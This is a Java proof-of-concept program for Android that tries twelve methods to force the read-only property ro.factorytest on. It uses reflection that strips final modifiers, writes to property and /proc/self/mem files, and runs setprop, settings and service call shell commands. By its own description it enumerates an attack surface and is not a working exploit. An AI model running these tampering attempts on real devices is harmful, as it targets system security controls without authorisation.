package com.poc;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;

public class Main {
    public static void main(String[] args) throws Exception {
        System.out.println("=== uid=" + getUid() + " ===");
        System.out.println("SELinux context: " + getSelinuxContext());
        System.out.println("[*] Starting exhaustive factorytest attack surface enumeration...\n");

        tryMethod1();
        tryMethod2();
        tryMethod3();
        tryMethod4();
        tryMethod5();
        tryMethod6();
        tryMethod7();
        tryMethod8();
        tryMethod9();
        tryMethod10();
        tryMethod11();
        tryMethod12();

        System.out.println("\n[+] All methods attempted. Detailed results above.");
        System.out.println("[*] Note: ro.factorytest cannot be changed without root/system privileges.");
        System.out.println("[*] This is a validation of attack surfaces, not a working exploit.");

        while (true) Thread.sleep(60000);
    }

    private static void tryMethod1() {
        try {
            Class<?> sp = Class.forName("android.os.SystemProperties");
            Method set = sp.getMethod("set", String.class, String.class);
            set.setAccessible(true);
            set.invoke(null, "ro.factorytest", "1");
            System.out.println("[Method1] SystemProperties.set invoked (ro. ignored)");
        } catch (Exception e) {
            System.out.println("[Method1] Failed: " + e.getMessage());
        }
    }

    private static void tryMethod2() {
        try {
            Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
            Field field = ro.getDeclaredField("FACTORYTEST");
            field.setAccessible(true);
            Field mod = Field.class.getDeclaredField("modifiers");
            mod.setAccessible(true);
            mod.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            field.setInt(null, 1);
            System.out.println("[Method2] RoSystemProperties.FACTORYTEST = 1 (may have worked in this classloader)");
        } catch (UnsatisfiedLinkError e) {
            System.out.println("[Method2] UnsatisfiedLinkError (dalvikvm cannot load RoSystemProperties)");
        } catch (Exception e) {
            System.out.println("[Method2] Failed: " + e);
        }
    }

    private static void tryMethod3() {
        String[] paths = {
            "/dev/__properties__/property_info",
            "/dev/__properties__/properties_serial",
            "/dev/__properties__/u:object_r:exported_default_prop:s0"
        };
        boolean any = false;
        for (String p : paths) {
            try (FileOutputStream fos = new FileOutputStream(p, true)) {
                fos.write("ro.factorytest=1\n".getBytes());
                fos.flush();
                System.out.println("[Method3] Wrote to " + p);
                any = true;
                break;
            } catch (Exception ignored) {}
        }
        if (!any) System.out.println("[Method3] Failed to write to any /dev/__properties__/ path");
    }

    private static void tryMethod4() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "setprop ro.factorytest 1"});
            p.waitFor();
            if (p.exitValue() == 0) {
                System.out.println("[Method4] setprop command succeeded (but ro. ignored)");
            } else {
                System.out.println("[Method4] setprop failed (exit " + p.exitValue() + ")");
            }
        } catch (Exception e) {
            System.out.println("[Method4] Failed: " + e);
        }
    }

    private static void tryMethod5() {
        try {
            File f = new File("/data/property/ro.factorytest");
            f.getParentFile().mkdirs();
            try (FileOutputStream fos = new FileOutputStream(f)) {
                fos.write("1\n".getBytes());
                fos.flush();
            }
            System.out.println("[Method5] Wrote to /data/property/ro.factorytest (may not be read)");
        } catch (Exception e) {
            System.out.println("[Method5] Failed: " + e);
        }
    }

    private static void tryMethod6() {
        try {
            try (FileOutputStream fos = new FileOutputStream("/proc/self/mem")) {
                fos.write(0); 
                System.out.println("[Method6] Wrote to /proc/self/mem (unexpected success)");
            } catch (Exception e) {
                System.out.println("[Method6] Failed (expected): " + e);
            }
        } catch (Exception e) {
            System.out.println("[Method6] Failed: " + e);
        }
    }

    private static void tryMethod7() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "export ro.factorytest=1"});
            p.waitFor();
            System.out.println("[Method7] Environment variable set (Java does not read it)");
        } catch (Exception e) {
            System.out.println("[Method7] Failed: " + e);
        }
    }

    private static void tryMethod8() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "settings put global factorytest 1"});
            p.waitFor();
            if (p.exitValue() == 0) {
                System.out.println("[Method8] settings put global factorytest 1 succeeded (no effect on ro.factorytest)");
            } else {
                System.out.println("[Method8] settings put failed");
            }
        } catch (Exception e) {
            System.out.println("[Method8] Failed: " + e);
        }
    }

    private static void tryMethod9() {
        try {
            Class<?> ft = Class.forName("android.os.FactoryTest");
            for (Field f : ft.getDeclaredFields()) {
                if (f.getType() == int.class && f.getName().contains("MODE")) {
                    f.setAccessible(true);
                    Field mod = Field.class.getDeclaredField("modifiers");
                    mod.setAccessible(true);
                    mod.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                    f.setInt(null, 1);
                    System.out.println("[Method9] Set " + f.getName() + " = 1");
                    return;
                }
            }
        } catch (UnsatisfiedLinkError e) {
            System.out.println("[Method9] UnsatisfiedLinkError (FactoryTest depends on SystemProperties)");
        } catch (Exception e) {
            System.out.println("[Method9] Failed: " + e);
        }
    }

    private static void tryMethod10() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/service", "call", "property", "1", "s16", "ro.factorytest", "s16", "1"});
            p.waitFor();
            if (p.exitValue() == 0) {
                System.out.println("[Method10] service call attempted (likely ignored)");
            } else {
                System.out.println("[Method10] service call failed");
            }
        } catch (Exception e) {
            System.out.println("[Method10] Failed: " + e);
        }
    }

    private static void tryMethod11() {
        try {
            File f = new File("/data/misc/property/ro.factorytest");
            f.getParentFile().mkdirs();
            try (FileOutputStream fos = new FileOutputStream(f)) {
                fos.write("1\n".getBytes());
                fos.flush();
            }
            System.out.println("[Method11] Wrote to /data/misc/property/ro.factorytest (may not be read)");
        } catch (Exception e) {
            System.out.println("[Method11] Failed: " + e);
        }
    }

    private static void tryMethod12() {
        try (BufferedReader r = new BufferedReader(new FileReader("/system/build.prop"))) {
            String line;
            while ((line = r.readLine()) != null) {
                if (line.startsWith("ro.factorytest=")) {
                    System.out.println("[Method12] Current value in build.prop: " + line);
                    return;
                }
            }
            System.out.println("[Method12] ro.factorytest not found in build.prop");
        } catch (Exception e) {
            System.out.println("[Method12] Failed to read build.prop: " + e);
        }
    }

    private static int getUid() {
        try (BufferedReader r = new BufferedReader(new FileReader("/proc/self/status"))) {
            String line;
            while ((line = r.readLine()) != null) {
                if (line.startsWith("Uid:")) {
                    String[] parts = line.trim().split("\\s+");
                    if (parts.length > 1) return Integer.parseInt(parts[1]);
                }
            }
        } catch (Exception ignored) {}
        return -1;
    }

    private static String getSelinuxContext() {
        try (FileInputStream fis = new FileInputStream("/proc/self/attr/current")) {
            byte[] b = new byte[1024];
            int len = fis.read(b);
            if (len > 0) return new String(b, 0, len).trim();
        } catch (Exception ignored) {}
        return "unknown";
    }
}
